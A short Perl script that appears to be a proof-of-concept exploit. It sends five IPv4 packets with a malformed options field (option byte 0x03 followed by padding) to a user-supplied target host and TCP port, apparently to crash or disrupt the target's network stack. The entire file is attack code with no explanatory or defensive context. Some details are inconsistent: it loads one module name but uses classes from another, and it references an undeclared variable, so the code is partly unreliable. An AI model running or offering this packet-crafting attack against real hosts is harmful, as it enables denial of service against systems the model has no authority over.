#!/usr/bin/perl
use strict;
use warnings;

my %opts;
use Getopt::Std;
getopts('t:p:', \%opts);
die("Usage: $0 -t TARGET -p PORT\n") unless $opts{t} && $opts{p};

use Net::Pkt;

$Env->debug(3);

my $frame = Net::Packet::Frame->new(
   l3 => Net::Packet::IPv4->new(
      dst     => $opts{t},
      options => "\x03\x27". 'G'x38,
   ),
   l4 => Net::Packet::TCP->new(
      dst => $opts{p},
   ),
);

$frame->send for 1..5;
